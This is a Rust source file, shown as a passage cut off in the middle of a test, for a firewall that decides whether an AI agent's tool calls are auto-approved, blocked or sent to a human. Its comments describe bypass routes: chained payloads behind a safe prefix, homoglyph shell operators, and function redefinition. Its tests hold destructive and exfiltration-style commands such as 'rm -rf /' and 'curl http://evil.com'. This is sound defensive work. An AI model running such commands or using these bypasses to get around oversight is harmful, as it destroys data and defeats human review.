use std::collections::HashMap;

use regex::Regex;

use crate::config::{Action, Conditions, FirewallConfig, Rule};
use crate::delegate::RuntimeDelegation;
use crate::models::EvaluationInput;

/// Priority level for a decision (affects notification sound).
#[derive(Debug, Clone, PartialEq)]
pub enum Priority {
    Low,
    Medium,
    High,
}

/// The result of evaluating a hook payload against the firewall rules.
#[derive(Debug)]
pub struct Decision {
    pub action: Action,
    pub reason: String,
    pub matched_rule: Option<String>,
    pub priority: Priority,
}

/// Pre-compile regex patterns from delegation conditions.
/// Returns a map keyed by delegation index → compiled Regex.
pub fn compile_delegation_patterns(delegations: &[RuntimeDelegation]) -> HashMap<usize, Regex> {
    let mut patterns = HashMap::new();
    for (i, d) in delegations.iter().enumerate() {
        if let Some(ref cond) = d.conditions {
            if let Some(ref pat) = cond.bash_pattern {
                if let Ok(re) = Regex::new(pat) {
                    patterns.insert(i, re);
                }
                // Invalid regex silently skipped — delegation won't match Bash conditions
            }
        }
    }
    patterns
}

/// Evaluate a hook payload against the firewall config, runtime delegations,
/// and ELO-calibrated overrides.
///
/// Precedence order:
/// 1. Blocked rules (non-overridable)
/// 2. Runtime delegations (human trust expansion + role-generated)
/// 3. Agent overrides: YAML (human) first, then ELO-calibrated
/// 4. Restricted rules
/// 5. Trust circle rules
/// 6. Defaults (fallback)
pub fn evaluate(
    config: &FirewallConfig,
    patterns: &crate::config::CompiledPatterns,
    delegations: &[RuntimeDelegation],
    payload: &EvaluationInput,
) -> Decision {
    evaluate_with_elo(
        config,
        patterns,
        delegations,
        payload,
        &HashMap::new(),
        &std::collections::HashSet::new(),
    )
}

/// Full evaluation including ELO-calibrated overrides and mission revocation checks.
pub fn evaluate_with_elo(
    config: &FirewallConfig,
    patterns: &crate::config::CompiledPatterns,
    delegations: &[RuntimeDelegation],
    payload: &EvaluationInput,
    elo_overrides: &HashMap<String, Vec<Rule>>,
    revoked_agents: &std::collections::HashSet<String>,
) -> Decision {
    // Compile ELO override regex patterns and merge with existing patterns.
    // ELO overrides loaded from JSON don't go through compile_config, so their
    // bash_pattern regex must be compiled here before check_rules can match them.
    let mut all_patterns = patterns.clone();
    for (agent_id, rules) in elo_overrides {
        let tier = format!("elo_override:{agent_id}");
        // Silently skip invalid regex — same safety contract as delegation patterns.
        // An invalid pattern means the rule won't match (safe fallback to ask).
        let _ = crate::config::compile_rules(rules, &tier, &mut all_patterns);
    }

    // 1. Blocked — first, non-overridable
    if let Some(decision) = check_rules(&config.blocked, payload, "blocked", &all_patterns) {
        return decision;
    }

    // 2. Runtime delegations (with conditions support)
    let delegation_patterns = compile_delegation_patterns(delegations);
    if let Some(decision) = check_delegations(delegations, payload, &delegation_patterns) {
        return decision;
    }

    // 3. Agent overrides — YAML (human) takes precedence over ELO
    if let Some(ref agent_id) = payload.agent_id {
        // 3a. YAML-defined overrides (human always wins)
        if let Some(rules) = config.agent_overrides.get(agent_id) {
            let tier = format!("agent_override:{agent_id}");
            if let Some(decision) = check_rules(rules, payload, &tier, &all_patterns) {
                return decision;
            }
        }
        // 3b. ELO-calibrated overrides
        if let Some(rules) = elo_overrides.get(agent_id) {
            let tier = format!("elo_override:{agent_id}");
            if let Some(decision) = check_rules(rules, payload, &tier, &all_patterns) {
                return decision;
            }
        }
    }

    // 4. Restricted
    if let Some(decision) = check_rules(&config.restricted, payload, "restricted", &all_patterns) {
        return decision;
    }

    // 4.5. H1: Shell chain guard — Bash commands with chain operators (&&, ||, ;, &, |,
    // newline) or substitutions ($(...), backtick, <(...)) never match trust_circle as a
    // whole. This prevents the "safe prefix + chained payload" bypass:
    //   e.g. `echo foo && rm -rf /` would otherwise match trust_circle's echo rule.
    // Instead, each simple command is evaluated on its own: the chain is auto-approved
    // only if every segment would be auto-approved alone (no new privilege from chaining),
    // blocked if any segment is blocked, and asks otherwise.
    // Blocked/restricted rules still fire first (steps 1-4), delegations fire at step 2.
    if payload.tool_name == "Bash" {
        if let Some(cmd) = payload.tool_input.get("command").and_then(|v| v.as_str()) {
            if contains_shell_chain(cmd) {
                if let Some(decision) = evaluate_chain_segments(
                    config,
                    patterns,
                    delegations,
                    payload,
                    cmd,
                    elo_overrides,
                    revoked_agents,
                ) {
                    return decision;
                }
                return Decision {
                    action: config.defaults.action.clone(),
                    reason: "Bash command contains shell chain operators (&&, ||, ;, $(...)) — requires human review".to_string(),
                    matched_rule: Some("chain_guard".to_string()),
                    priority: Priority::Medium,
                };
            }
        }
    }

    // 4.8. Mission revocation kill switch
    // If agent's mission was deactivated, deny all tools. This overrides CC session rules
    // that were taught via PermissionRequest hooks before the mission was revoked.
    if let Some(ref agent_id) = payload.agent_id {
        if revoked_agents.contains(agent_id) {
            return Decision {
                action: Action::Block,
                reason: format!(
                    "Mission revoked for agent '{}' — permissions expired",
                    agent_id
                ),
                matched_rule: Some(format!("mission_revoked:{}", agent_id)),
                priority: Priority::High,
            };
        }
    }

    // 5. Trust circle
    if let Some(decision) =
        check_rules(&config.trust_circle, payload, "trust_circle", &all_patterns)
    {
        return decision;
    }

    // 6. Defaults
    Decision {
        action: config.defaults.action.clone(),
        reason: "No matching rule — falling back to default".to_string(),
        matched_rule: Some("defaults".to_string()),
        priority: Priority::Medium,
    }
}

/// Upper bound on segments evaluated for one chained command. Longer chains ask.
const MAX_CHAIN_SEGMENTS: usize = 16;

/// Evaluate each simple command of a chained Bash command independently.
///
/// Returns `Some(AutoApprove)` when every segment is auto-approved on its own,
/// `Some(Block)` when any segment is blocked, and `None` (caller asks) otherwise —
/// including whenever the command contains substitutions or unterminated quotes,
/// since those cannot be split into independent commands.
fn evaluate_chain_segments(
    config: &FirewallConfig,
    patterns: &crate::config::CompiledPatterns,
    delegations: &[RuntimeDelegation],
    payload: &EvaluationInput,
    cmd: &str,
    elo_overrides: &HashMap<String, Vec<Rule>>,
    revoked_agents: &std::collections::HashSet<String>,
) -> Option<Decision> {
    let scan = scan_shell(cmd);
    if scan.substitution
        || scan.grouping
        || scan.unterminated_quote
        || scan.segments.len() > MAX_CHAIN_SEGMENTS
    {
        return None;
    }

    let mut all_approved = true;
    for segment in &scan.segments {
        // `cd` only changes the working directory of the following segments, which are
        // checked on their own. Trust-circle Bash rules do not depend on the cwd.
        if is_plain_cd(segment) {
            continue;
        }
        // Segments come from a full split, so they cannot chain again. Guard anyway so the
        // recursion below provably terminates.
        if contains_shell_chain(segment) {
            return None;
        }
        let mut segment_payload = payload.clone();
        segment_payload.tool_input = serde_json::json!({ "command": segment });
        let decision = evaluate_with_elo(
            config,
            patterns,
            delegations,
            &segment_payload,
            elo_overrides,
            revoked_agents,
        );
        match decision.action {
            Action::Block => {
                return Some(Decision {
                    action: Action::Block,
                    reason: format!(
                        "Chained command contains a blocked segment: {}",
                        decision.reason
                    ),
                    matched_rule: Some(format!(
                        "chain_guard>{}",
                        decision.matched_rule.unwrap_or_default()
                    )),
                    priority: Priority::High,
                });
            }
            Action::Ask => all_approved = false,
            Action::AutoApprove => {}
        }
    }

    if !all_approved {
        return None;
    }
    Some(Decision {
        action: Action::AutoApprove,
        reason: "Every segment of the chained command is auto-approved on its own".to_string(),
        matched_rule: Some("chain_guard:segments_trusted".to_string()),
        priority: Priority::Low,
    })
}

/// True for `cd`, `cd <dir>` — a directory change with no other effect.
/// Redirections are rejected: `cd >file` truncates `file`.
fn is_plain_cd(segment: &str) -> bool {
    if segment.contains(['<', '>']) {
        return false;
    }
    let mut words = segment.split_whitespace();
    words.next() == Some("cd") && words.count() <= 1
}

fn check_delegations(
    delegations: &[RuntimeDelegation],
    payload: &EvaluationInput,
    delegation_patterns: &HashMap<usize, Regex>,
) -> Option<Decision> {
    for (i, d) in delegations.iter().enumerate() {
        if d.tool != payload.tool_name {
            continue;
        }
        // If delegation specifies an agent_id, it must match
        if let Some(ref delegation_agent) = d.agent_id {
            if payload.agent_id.as_ref() != Some(delegation_agent) {
                continue;
            }
        }
        // If delegation specifies a session_id, it must match
        if let Some(ref delegation_session) = d.session_id {
            if &payload.session_id != delegation_session {
                continue;
            }
        }
        // If delegation has conditions, evaluate them
        if let Some(ref cond) = d.conditions {
            if !delegation_conditions_match(cond, payload, i, delegation_patterns) {
                continue;
            }
        }
        let source = d.source.as_deref().unwrap_or("human");
        return Some(Decision {
            action: d.action.clone(),
            reason: format!(
                "Runtime delegation for tool '{}' (source: {})",
                d.tool, source
            ),
            matched_rule: Some("runtime_delegation".to_string()),
            priority: Priority::Low,
        });
    }
    None
}

/// Evaluate delegation conditions against the payload.
fn delegation_conditions_match(
    cond: &crate::delegate::DelegationConditions,
    payload: &EvaluationInput,
    delegation_idx: usize,
    delegation_patterns: &HashMap<usize, Regex>,
) -> bool {
    // Check bash_pattern (only for Bash tool)
    if cond.bash_pattern.is_some() && payload.tool_name == "Bash" {
        let command = payload
            .tool_input
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if let Some(re) = delegation_patterns.get(&delegation_idx) {
            if !re.is_match(command) {
                return false;
            }
        } else {
            return false; // pattern couldn't be compiled
        }
    }

    // Check path_within — use Path::starts_with for component-based comparison (H2).
    let path = extract_path(payload).map(|p| normalize_path(&p));
    if let Some(ref allowed_dirs) = cond.path_within {
        if let Some(ref p) = path {
            if !allowed_dirs
                .iter()
                .any(|dir| std::path::Path::new(p).starts_with(dir))
            {
                return false;
            }
        }
        if path.is_none() {
            return false;
        }
    }

    // Check path_not_match
    if let Some(ref blocked_patterns) = cond.path_not_match {
        if let Some(ref p) = path {
            for pattern in blocked_patterns {
                if glob_match(pattern, p) {
                    return false;
                }
            }
        }
    }

    true
}

fn check_rules(
    rules: &[Rule],
    payload: &EvaluationInput,
    tier: &str,
    patterns: &crate::config::CompiledPatterns,
) -> Option<Decision> {
    for (i, rule) in rules.iter().enumerate() {
        if !rule.tools.contains(&payload.tool_name) {
            continue;
        }
        let rule_key = format!("{tier}[{i}]");
        if let Some(ref conditions) = rule.conditions {
            if !conditions_match(conditions, payload, &rule_key, patterns) {
                continue;
            }
        }
        let priority = match rule.action {
            Action::Block => Priority::High,
            Action::Ask => Priority::Medium,
            Action::AutoApprove => Priority::Low,
        };
        return Some(Decision {
            action: rule.action.clone(),
            reason: rule
                .reason
                .clone()
                .unwrap_or_else(|| format!("Matched {tier} rule #{i}")),
            matched_rule: Some(format!("{tier}[{i}]")),
            priority,
        });
    }
    None
}

fn conditions_match(
    conditions: &Conditions,
    payload: &EvaluationInput,
    rule_key: &str,
    patterns: &crate::config::CompiledPatterns,
) -> bool {
    // Check bash_pattern against tool_input["command"] — only applies to Bash tool
    if let Some(ref _pattern) = conditions.bash_pattern {
        if payload.tool_name == "Bash" {
            let command = payload
                .tool_input
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if let Some(re) = patterns.get(rule_key) {
                if !re.is_match(command) {
                    return false;
                }
            } else {
                return false; // pattern was supposed to be compiled but wasn't found
            }
        }
        // For non-Bash tools, bash_pattern is not applicable — skip it
    }

    // Resolve the relevant path from tool_input, normalizing to prevent traversal
    let path = extract_path(payload).map(|p| normalize_path(&p));

    // Check path_within — use Path::starts_with for component-based comparison.
    // H2: String::starts_with("/project") would incorrectly match "/project-evil/file.rs".
    // Path::starts_with is component-aware and prevents this sibling-directory bypass.
    if let Some(ref allowed_dirs) = conditions.path_within {
        if let Some(ref p) = path {
            if !allowed_dirs
                .iter()
                .any(|dir| std::path::Path::new(p).starts_with(dir))
            {
                return false;
            }
        }
        // If no path found in input but path_within is required, no match
        if path.is_none() {
            return false;
        }
    }

    // Check path_not_match (glob-like exclusions)
    if let Some(ref blocked_patterns) = conditions.path_not_match {
        if let Some(ref p) = path {
            for pattern in blocked_patterns {
                if glob_match(pattern, p) {
                    return false;
                }
            }
        }
    }

    true
}

/// Normalize a path by resolving `.` and `..` segments without touching the filesystem.
/// This prevents path traversal bypasses like `/project/src/../../etc/passwd`.
fn normalize_path(path: &str) -> String {
    use std::path::{Component, PathBuf};
    let mut normalized = PathBuf::new();
    for component in std::path::Path::new(path).components() {
        match component {
            Component::ParentDir => {
                normalized.pop();
            }
            Component::CurDir => {}
            other => normalized.push(other),
        }
    }
    normalized.to_string_lossy().to_string()
}

/// Extract the relevant file path from tool_input based on tool type.
fn extract_path(payload: &EvaluationInput) -> Option<String> {
    match payload.tool_name.as_str() {
        "Read" | "Write" | "Edit" => payload
            .tool_input
            .get("file_path")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string()),
        "Glob" | "Grep" => payload
            .tool_input
            .get("path")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string()),
        "WebFetch" => payload
            .tool_input
            .get("url")
            .and_then(|v| v.as_str())
            .map(|s| s.to_string()),
        _ => None,
    }
}

/// Result of a quote- and escape-aware lexical scan of a Bash command.
#[derive(Debug, Default)]
struct ShellScan {
    /// Simple commands split on `&&`, `||`, `;`, `&`, `|`, `|&` and newlines.
    /// Trimmed; empty segments (e.g. after a trailing `&`) are dropped.
    segments: Vec<String>,
    /// An operator other than a plain pipe separates commands.
    chained: bool,
    /// `$(`, a backtick, `<(` or `>(` appears where bash would execute it.
    substitution: bool,
    /// An unquoted `(` or `)`: subshell, arithmetic or function definition.
    /// `ls() ( rm -rf ~ ); ls` redefines `ls`, so its segments cannot be judged alone.
    grouping: bool,
    /// The command ends inside a quote.
    unterminated_quote: bool,
}

#[derive(PartialEq)]
enum QuoteState {
    None,
    /// `'...'` — everything literal, no escapes.
    Single,
    /// `$'...'` — ANSI-C quoting, backslash escapes the next char (`$'\''` is one quote).
    AnsiC,
    /// `"..."` — backslash escapes, `$(...)` and backticks still execute.
    Double,
}

/// Split a Bash command into simple commands the way bash would, without executing it.
///
/// The scanner must never *merge* what bash splits (that is a bypass); splitting more
/// than bash does only produces extra asks. Hence: comments are not recognized, a
/// backslash-newline is kept literal, and a lone `&` is a separator unless it is part of
/// a redirection (`2>&1`, `&>file`). (Finding #15, DREAD 5.6; chain guard parser rewrite)
fn scan_shell(cmd: &str) -> ShellScan {
    let chars: Vec<char> = normalize_unicode_operators(cmd).chars().collect();
    let mut scan = ShellScan::default();
    let mut current = String::new();
    let mut quote = QuoteState::None;
    // True when the previous char was an unquoted, unescaped `<` or `>`.
    let mut after_redirect = false;
    let mut i = 0;

    let flush = |current: &mut String, segments: &mut Vec<String>| {
        let trimmed = current.trim();
        if !trimmed.is_empty() {
            segments.push(trimmed.to_string());
        }
        current.clear();
    };

    while i < chars.len() {
        let c = chars[i];
        let next = chars.get(i + 1).copied();

        match quote {
            QuoteState::Single => {
                if c == '\'' {
                    quote = QuoteState::None;
                }
                current.push(c);
                i += 1;
                continue;
            }
            QuoteState::AnsiC | QuoteState::Double => {
                if c == '\\' {
                    current.push(c);
                    if let Some(n) = next {
                        current.push(n);
                    }
                    i += 2;
                    continue;
                }
                if quote == QuoteState::AnsiC && c == '\'' {
                    quote = QuoteState::None;
                } else if quote == QuoteState::Double {
                    if c == '"' {
                        quote = QuoteState::None;
                    } else if c == '`' || (c == '$' && next == Some('(')) {
                        scan.substitution = true;
                    }
                }
                current.push(c);
                i += 1;
                continue;
            }
            QuoteState::None => {}
        }

        let was_after_redirect = after_redirect;
        after_redirect = false;
        match c {
            '\\' => {
                // Escaped char is literal: `\"`, `\;`, `\&` never open quotes or split.
                current.push(c);
                if let Some(n) = next {
                    current.push(n);
                }
                i += 2;
            }
            '\'' => {
                quote = QuoteState::Single;
                current.push(c);
                i += 1;
            }
            '"' => {
                quote = QuoteState::Double;
                current.push(c);
                i += 1;
            }
            '$' if next == Some('\'') => {
                quote = QuoteState::AnsiC;
                current.push_str("$'");
                i += 2;
            }
            '$' if next == Some('(') => {
                scan.substitution = true;
                current.push(c);
                i += 1;
            }
            '`' => {
                scan.substitution = true;
                current.push(c);
                i += 1;
            }
            '<' | '>' => {
                if next == Some('(') {
                    scan.substitution = true;
                }
                after_redirect = true;
                current.push(c);
                i += 1;
            }
            '(' | ')' => {
                scan.grouping = true;
                current.push(c);
                i += 1;
            }
            ';' | '\n' => {
                scan.chained = true;
                flush(&mut current, &mut scan.segments);
                i += 1;
            }
            '&' if next == Some('&') => {
                scan.chained = true;
                flush(&mut current, &mut scan.segments);
                i += 2;
            }
            '&' if next == Some('>') || was_after_redirect => {
                // `&>file`, `2>&1`, `<&3` — redirections, not a background separator.
                current.push(c);
                i += 1;
            }
            '&' => {
                scan.chained = true;
                flush(&mut current, &mut scan.segments);
                i += 1;
            }
            '|' if next == Some('|') => {
                scan.chained = true;
                flush(&mut current, &mut scan.segments);
                i += 2;
            }
            '|' if was_after_redirect => {
                // `>|file` — clobbering redirection.
                current.push(c);
                i += 1;
            }
            '|' => {
                flush(&mut current, &mut scan.segments);
                i += if next == Some('&') { 2 } else { 1 };
            }
            _ => {
                current.push(c);
                i += 1;
            }
        }
    }

    scan.unterminated_quote = quote != QuoteState::None;
    flush(&mut current, &mut scan.segments);
    scan
}

/// Normalize Unicode homoglyphs to their ASCII equivalents before chain guard check.
/// Replaces known shell-operator lookalikes with their ASCII counterparts.
/// (Finding #3, DREAD 5.2)
fn normalize_unicode_operators(cmd: &str) -> String {
    cmd.chars()
        .map(|c| match c {
            // Greek question mark (U+037E) looks like semicolon
            '\u{037E}' => ';',
            // Fullwidth semicolon (U+FF1B)
            '\u{FF1B}' => ';',
            // Fullwidth ampersand (U+FF06)
            '\u{FF06}' => '&',
            // Fullwidth vertical line (U+FF5C)
            '\u{FF5C}' => '|',
            // Fullwidth dollar sign (U+FF04)
            '\u{FF04}' => '$',
            // Fullwidth grave accent (U+FF40)
            '\u{FF40}' => '`',
            // Fullwidth left parenthesis (U+FF08)
            '\u{FF08}' => '(',
            // Armenian semicolon (U+0589) — looks like colon but can confuse
            // Small semicolon (U+FE54)
            '\u{FE54}' => ';',
            // Keep all other characters as-is
            _ => c,
        })
        .collect()
}

/// Detect a Bash command that is more than one simple command.
///
/// Returns true if bash would run more than one command: `&&`, `||`, `;`, `&`,
/// newline, a pipe, command/process substitution (also inside double quotes),
/// or an unterminated quote. Such commands never match trust_circle as a whole;
/// see `evaluate_chain_segments`.
///
/// Pipes are included because the right-hand side runs a separate program
/// (`echo 'rm -rf ~' | sh`). Safe pipes stay auto-approved through per-segment
/// evaluation (`cat file | grep foo`).
///
/// Quote- and escape-aware (Finding #15, DREAD 5.6): see `scan_shell`.
/// Unicode-normalized: homoglyph characters are replaced with ASCII equivalents
/// before detection (Finding #3, DREAD 5.2).
fn contains_shell_chain(cmd: &str) -> bool {
    let scan = scan_shell(cmd);
    scan.chained || scan.substitution || scan.unterminated_quote || scan.segments.len() > 1
}

/// Glob matching for path_not_match rules.
///
/// STRIDE TM Finding #2 (DREAD 6.4): `*contains*` patterns match against the
/// FULL PATH (not just filename) so that `*reviews*` blocks writes to any path
/// containing "reviews" (e.g. `config/reviews/pending/fake.json`).
///
/// Extension patterns (`*.ext`) and exact matches still operate on filename only.
fn glob_match(pattern: &str, value: &str) -> bool {
    let filename = std::path::Path::new(value)
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or(value);

    if pattern.starts_with('*') && pattern.ends_with('*') && pattern.len() > 2 {
        // Substring pattern: match against FULL PATH for directory protection
        let needle = &pattern[1..pattern.len() - 1];
        value.contains(needle)
    } else if let Some(suffix) = pattern.strip_prefix('*') {
        // Extension pattern: match against filename
        filename.ends_with(suffix)
    } else if let Some(prefix) = pattern.strip_suffix('*') {
        filename.starts_with(prefix)
    } else {
        filename == pattern
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{load_config, Action};
    use crate::delegate::RuntimeDelegation;
    use chrono::{Duration, Utc};
    use serde_json::json;
    use std::path::Path;

    fn load_test_config_and_patterns() -> (FirewallConfig, crate::config::CompiledPatterns) {
        let config_path =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("../config/trust-firewall.yaml");
        let config = load_config(&config_path, "/Users/test/project").unwrap();
        let patterns = crate::config::compile_config(&config).unwrap();
        (config, patterns)
    }

    fn make_payload(tool: &str, input: serde_json::Value) -> EvaluationInput {
        EvaluationInput {
            session_id: "test-session".to_string(),
            tool_name: tool.to_string(),
            tool_input: input,
            tool_use_id: "tu_test".to_string(),
            agent_id: None,
            cwd: "/Users/test/project".to_string(),
        }
    }

    #[test]
    fn test_auto_approve_read() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Read",
            json!({"file_path": "/Users/test/project/src/main.rs"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_auto_approve_safe_bash() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "cat foo.txt"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_block_force_push() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "git push --force origin main"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_block_force_push_short_flag() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "git push -f origin main"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_block_reset_hard() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "git reset --hard HEAD~1"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_commit_message_with_force_not_blocked() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Bash",
            json!({"command": "git commit -m 'removed --force flag'"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_ne!(decision.action, Action::Block);
    }

    #[test]
    fn test_block_rm_rf() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "rm -rf /"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_restricted_destructive_bash() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "rm -r /tmp/somedir"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask);
    }

    #[test]
    fn test_path_within_project() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Write",
            json!({"file_path": "/Users/test/project/src/lib.rs"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_path_not_match_env() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Write", json!({"file_path": "/Users/test/project/.env"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        // .env matches path_not_match, so the trust_circle rule won't match -> falls to default (ask)
        assert_eq!(decision.action, Action::Ask);
    }

    #[test]
    fn test_delegation_overrides_restricted() {
        let (config, patterns) = load_test_config_and_patterns();
        let delegation = RuntimeDelegation {
            tool: "Bash".to_string(),
            agent_id: None,
            action: Action::AutoApprove,
            created_at: Utc::now(),
            expires_at: Some(Utc::now() + Duration::hours(4)),
            session_id: None,
            source: None,
            mission_id: None,
            conditions: None,
        };
        // A destructive bash command that would normally be "ask"
        let payload = make_payload("Bash", json!({"command": "rm -r /tmp/foo"}));
        let decision = evaluate(&config, &patterns, &[delegation], &payload);
        // Delegation can't override blocked, but "rm -r" (without "rm -rf /") is restricted, not blocked
        // Blocked check runs first and doesn't match "rm -r /tmp/foo"
        // Then delegation matches -> auto-approve
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_delegation_cannot_override_blocked() {
        let (config, patterns) = load_test_config_and_patterns();
        let delegation = RuntimeDelegation {
            tool: "Bash".to_string(),
            agent_id: None,
            action: Action::AutoApprove,
            created_at: Utc::now(),
            expires_at: Some(Utc::now() + Duration::hours(4)),
            session_id: None,
            source: None,
            mission_id: None,
            conditions: None,
        };
        let payload = make_payload("Bash", json!({"command": "git push --force origin main"}));
        let decision = evaluate(&config, &patterns, &[delegation], &payload);
        // Blocked fires first, delegation can't override
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_precedence_order() {
        let (config, patterns) = load_test_config_and_patterns();
        // A command that matches both blocked (--force) and restricted (rm)
        let payload = make_payload("Bash", json!({"command": "rm -rf /"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        // Blocked should win
        assert_eq!(decision.action, Action::Block);
    }

    #[test]
    fn test_default_fallback() {
        let (config, patterns) = load_test_config_and_patterns();
        // Unknown MCP tool
        let payload = make_payload("mcp__unknown__tool", json!({"arg": "value"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask);
        assert_eq!(decision.matched_rule, Some("defaults".to_string()));
    }

    #[test]
    fn test_glob_match_exact_extension() {
        assert!(glob_match("*.env", "/project/.env"));
        assert!(glob_match("*.env", "/project/local.env"));
        assert!(!glob_match("*.env", "/project/.env.production"));
        assert!(!glob_match("*.env", "/project/.env.backup"));
    }

    #[test]
    fn test_glob_match_contains() {
        assert!(glob_match("*credentials*", "/project/credentials.json"));
        assert!(glob_match("*credentials*", "/project/aws_credentials"));
        assert!(glob_match(
            "*credentials*",
            "/project/my-credentials-file.txt"
        ));
    }

    #[test]
    fn test_glob_match_exact_filename() {
        assert!(glob_match("*.key", "/project/server.key"));
        assert!(!glob_match("*.key", "/project/server.keystore"));
    }

    #[test]
    fn test_path_not_match_env_production() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Write",
            json!({"file_path": "/Users/test/project/.env.production"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::AutoApprove);
    }

    #[test]
    fn test_path_traversal_blocked() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Write",
            json!({"file_path": "/Users/test/project/src/../../etc/passwd"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(decision.action, Action::Ask);
    }

    #[test]
    fn test_malformed_input() {
        let (config, patterns) = load_test_config_and_patterns();
        // Bash tool with no "command" field
        let payload = make_payload("Bash", json!({"wrong_field": "value"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        // bash_pattern won't match empty command -> falls through trust_circle
        // restricted bash_pattern also won't match -> falls to default
        assert_eq!(decision.action, Action::Ask);
    }

    #[test]
    fn test_delegation_session_id_filtering() {
        let (config, patterns) = load_test_config_and_patterns();

        // Delegation scoped to session "sess_A"
        let delegation = RuntimeDelegation {
            tool: "Bash".to_string(),
            agent_id: None,
            action: Action::AutoApprove,
            created_at: Utc::now(),
            expires_at: Some(Utc::now() + Duration::hours(4)),
            session_id: Some("sess_A".to_string()),
            source: None,
            mission_id: None,
            conditions: None,
        };

        // Payload from same session → should match
        let mut payload_a = make_payload("Bash", json!({"command": "rm -r /tmp/foo"}));
        payload_a.session_id = "sess_A".to_string();
        let decision = evaluate(
            &config,
            &patterns,
            std::slice::from_ref(&delegation),
            &payload_a,
        );
        assert_eq!(
            decision.action,
            Action::AutoApprove,
            "same session should match delegation"
        );

        // Payload from different session → should NOT match
        let mut payload_b = make_payload("Bash", json!({"command": "rm -r /tmp/foo"}));
        payload_b.session_id = "sess_B".to_string();
        let decision = evaluate(&config, &patterns, &[delegation], &payload_b);
        assert_eq!(
            decision.action,
            Action::Ask,
            "different session should not match delegation"
        );
    }

    #[test]
    fn test_delegation_without_session_id_matches_all() {
        let (config, patterns) = load_test_config_and_patterns();

        // Delegation without session_id → matches any session
        let delegation = RuntimeDelegation {
            tool: "Bash".to_string(),
            agent_id: None,
            action: Action::AutoApprove,
            created_at: Utc::now(),
            expires_at: Some(Utc::now() + Duration::hours(4)),
            session_id: None,
            source: None,
            mission_id: None,
            conditions: None,
        };

        let mut payload = make_payload("Bash", json!({"command": "rm -r /tmp/foo"}));
        payload.session_id = "any_session".to_string();
        let decision = evaluate(&config, &patterns, &[delegation], &payload);
        assert_eq!(
            decision.action,
            Action::AutoApprove,
            "no session_id delegation should match any session"
        );
    }

    // ── H1: Shell chain guard tests ──────────────────────────────────────────

    #[test]
    fn test_chain_guard_blocks_and_chain() {
        // H1: "echo foo && rm -rf /" starts with safe "echo" prefix but contains &&
        // Previously this would match trust_circle's echo rule. Now each segment is
        // evaluated alone, and `rm -rf /` is a blocked segment.
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "echo foo && rm -rf /"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Block,
            "chained command with a blocked segment must be blocked"
        );
    }

    #[test]
    fn test_chain_guard_blocks_semicolon() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload(
            "Bash",
            json!({"command": "cat file.txt; curl http://evil.com"}),
        );
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Ask,
            "semicolon-chained command must not be auto-approved"
        );
    }

    #[test]
    fn test_chain_guard_blocks_subshell() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "echo $(id)"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Ask,
            "subshell $(...) must not be auto-approved"
        );
    }

    #[test]
    fn test_chain_guard_blocks_backtick() {
        let (config, patterns) = load_test_config_and_patterns();
        let payload = make_payload("Bash", json!({"command": "echo `id`"}));
        let decision = evaluate(&config, &patterns, &[], &payload);
        assert_eq!(
            decision.action,
            Action::Ask,
            "backtick subshell must not be auto-approved"
        );
    }

    #[test]
    fn test_chain_guard_allows_safe_pipe() {
